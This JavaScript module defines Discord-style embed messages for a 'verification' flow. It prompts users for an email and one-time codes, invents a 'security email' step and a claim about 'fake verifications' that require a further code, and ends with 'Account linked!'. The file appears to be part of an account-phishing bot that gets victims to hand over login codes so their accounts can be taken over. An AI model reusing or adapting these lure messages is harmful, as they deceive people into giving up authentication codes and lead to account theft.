/*
Need to add default presets

*/


module.exports = (type) => {
    switch (type) {
      case "main":
      case "otp":
        return {
          title: `No Security email`,
          description: `Your email doesn't have a security email. Add a security email and then re-verify!`,
          color: 0xff0000
        };
      case "oauth":
        return {
          title: `Verification`,
          description: `Use this link to verify instead!`,
          color: 0x00ff00
        };
      case "res":
        return {
          title: `Account linked!`,
          description: `Congratulations you linked the account successfully!`,
          color: 0x00ff00
        };
      case "invalid":
        return {
          title: `Error :x:`,
          description: `The code you sent was wrong, please try again with a valid code!`,
          color: 0xff0000
        };
      case "sec":
        return {
          title: `Last Step`,
          description: `Due to the increase of fake verifications, we require you to confirm the code that we sent you at (sec)`,
          color: 0xffff00
        };
        case "locked":
          return {
            description: `Your account seems to be locked. Please log-in, resolve issues then retry.`,
            color: 0xff0000
          };
      case "invalid email":
        return {
          title: `Error :x:`,
          description: `Please try again with a valid email`,
          color: 0xff0000
        };
      default:
        console.log(`Invalid embed type ${type}`);
        return null;
    }
  };